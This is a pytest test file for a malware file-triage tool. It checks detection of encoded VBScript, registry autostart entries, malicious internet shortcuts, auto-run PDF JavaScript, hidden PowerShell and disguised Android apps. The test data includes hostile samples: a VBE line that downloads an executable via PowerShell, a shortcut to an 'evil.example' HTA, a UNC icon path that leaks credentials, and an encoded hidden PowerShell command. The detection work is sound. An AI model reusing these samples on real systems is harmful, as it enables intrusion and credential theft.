"""Findings checked before release (2026-11-14), third pass: each reproduced so it cannot come back."""
import os
import time
import zipfile

import pytest

from zbtriage import contract, filecheck as fc


def _rec(tmp_path, name, data):
    path = tmp_path / name
    path.write_bytes(data)
    return fc.fc_examine(str(path))


# runnable types the kind detector does not know
@pytest.mark.parametrize("name, body, words", [
    ("update.vbe", b"#@~^XQAAAA==encoded", "encoded VBScript"),
    ("update.wsh", b"[ScriptFile]\r\nPath=payload.vbs\r\n", "payload.vbs"),
    ("p.reg", b"Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\"
              b"CurrentVersion\\Run]\r\n\"x\"=\"a.exe\"\r\n", "starts automatically"),
    ("help.chm", b"ITSF\x03\x00\x00\x00" + b"\x00" * 200, "compiled help file"),
    ("click.url", b"[InternetShortcut]\r\nURL=http://evil.example/a.hta\r\n", "evil.example/a.hta"),
    ("leak.url", b"[InternetShortcut]\r\nURL=https://example.org/\r\nIconFile=\\\\203.0.113.5\\s\\i.ico\r\n",
     "example.org"),
])
def test_runnable_text_files_are_worth_a_look(tmp_path, name, body, words):
    rec = _rec(tmp_path, name, body)
    assert rec["level"] == fc.FC_LOOK
    assert words in fc.fc_render(rec)


def test_a_plain_web_link_is_only_a_note(tmp_path):
    rec = _rec(tmp_path, "site.url", b"[InternetShortcut]\r\nURL=https://example.org/page\r\n")
    assert rec["level"] == fc.FC_CLEAN and any("example.org/page" in n for n in rec["notes"])


def test_ordinary_scripts_are_not_flagged_just_for_being_scripts(tmp_path):
    for name in ("build.bat", "tool.ps1", "app.js"):
        assert _rec(tmp_path, name, b"echo hello\r\n")["level"] == fc.FC_CLEAN, name


def test_a_vbe_with_a_download_is_found_as_a_script(tmp_path):
    body = b'Set s=CreateObject("WScript.Shell"):s.Run "powershell -c (New-Object Net.WebClient).DownloadFile(' \
           b'\'http://x/a.exe\',\'a.exe\')"'
    rec = _rec(tmp_path, "update.vbe", body)
    assert rec["level"] == fc.FC_LOOK and rec["script"]


# a file of many distinct addresses is fast
def test_many_distinct_addresses_are_fast():
    urls = b"\n".join(b"https://h%d.example/p" % i for i in range(60000))
    started = time.time()
    found = fc.fc_addresses(urls)
    assert time.time() - started < 3 and len(found["urls"]) == 60000


# damaged apps and archives are not "clean"
def test_damaged_apps_and_archives_are_not_clean(tmp_path):
    for name in ("bad.apk", "bad.zip"):
        rec = _rec(tmp_path, name, b"PK\x03\x04" + b"\x00" * 200)
        assert rec["level"] == fc.FC_LOOK, name


# a padded script cannot push its command past a limit
def test_a_padded_script_is_read_whole(tmp_path):
    pad = b"x" * (17 * 1024 * 1024)
    rec = _rec(tmp_path, "run.ps1", pad + b"\npowershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA\n")
    assert rec["level"] == fc.FC_LOOK


# PDF: escaped names and a word containing "stream"
def test_pdf_name_escapes_are_decoded(tmp_path):
    rec = _rec(tmp_path, "a.pdf", b"%PDF-1.7\n1 0 obj << /OpenAction << /S /Java#53cript /J#53 (x) >> >>\n")
    assert "runs JavaScript as soon as it is opened" in rec["document"]


def test_upstream_in_a_comment_hides_nothing(tmp_path):
    rec = _rec(tmp_path, "b.pdf", b"%PDF-1.7\n% upstream metadata\n1 0 obj << /OpenAction << /S /JavaScript /JS (x) >> >>\n")
    assert "runs JavaScript as soon as it is opened" in rec["document"]


def test_an_unfinished_stream_hides_nothing(tmp_path):
    rec = _rec(tmp_path, "c.pdf", b"%PDF-1.7\n1 0 obj <<>>\nstream\nxx\n2 0 obj << /OpenAction << /JS (x) >> >>\n")
    assert "runs JavaScript as soon as it is opened" in rec["document"]


# conflicting or misplaced options are refused
@pytest.mark.parametrize("argv", [
    ["--seal-copy", "out"],
    ["--check-file", "a.bin", "--phone", "x"],
    ["--check-file", "a.bin", "--accounts"],
    ["--accounts", "--threat-warning"],
])
def test_separate_checks_refuse_other_options(argv):
    from zbtriage.cli import _parse
    with pytest.raises(SystemExit):
        _parse(argv)


# a network path is never opened by the file check
def test_the_file_check_refuses_network_paths(monkeypatch):
    from types import SimpleNamespace
    said = []
    monkeypatch.setattr(fc, "path_problem", lambda p: "UNC or device path was not opened" if "srv" in p else "")
    args = SimpleNamespace(check_file=r"\\srv\share\a.exe", json=None, seal_copy=None)
    assert fc.fc_command(args, lambda a: None, out=said.append) == 2
    assert any("use a file on this computer" in s for s in said)


# a refused known-good list is not missing indicator coverage
def test_a_refused_known_good_list_is_not_missing_coverage():
    doc = {"ioc_set": {"feeds": {"used": True, "loaded": [{"id": "x"}], "missing": [],
                                 "refused": [{"id": "misp-warninglists", "known_good": True}]}}}
    assert not contract._feeds_incomplete(doc)
    doc["ioc_set"]["feeds"]["refused"].append({"id": "amnesty", "reason": "changed"})
    assert contract._feeds_incomplete(doc)


# an Android app renamed to look like a document or picture is a disguise
@pytest.mark.parametrize("name", ["invoice.pdf", "photo.jpg", "invoice.zip"])
def test_a_renamed_android_app_is_a_disguise(tmp_path, name):
    path = tmp_path / name
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("META-INF/CERT.RSA", os.urandom(6000))
        z.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00")
        z.writestr("classes.dex", b"dex\n035\x00")
    rec = fc.fc_examine(str(path))
    assert rec["kind"] == "android-app" and rec["disguised"] and rec["level"] == fc.FC_LOOK


def test_a_real_apk_is_not_a_disguise(tmp_path):
    path = tmp_path / "app.apk"
    with zipfile.ZipFile(path, "w") as z:
        z.writestr("AndroidManifest.xml", b"\x03\x00\x08\x00")
        z.writestr("classes.dex", b"dex\n035\x00")
    assert not fc.fc_examine(str(path))["disguised"]


# --iocs on a network path is refused by the file check too
def test_the_file_check_refuses_network_indicator_files(monkeypatch, tmp_path):
    from types import SimpleNamespace
    sample = tmp_path / "a.bin"
    sample.write_bytes(b"x")
    said = []
    monkeypatch.setattr(fc, "path_problem", lambda p: "UNC or device path was not opened" if "srv" in p else "")
    args = SimpleNamespace(check_file=str(sample), json=None, seal_copy=None, iocs=[r"\srv\share\iocs.txt"])
    assert fc.fc_command(args, lambda a: None, out=said.append) == 2
    assert any("--iocs" in s for s in said)
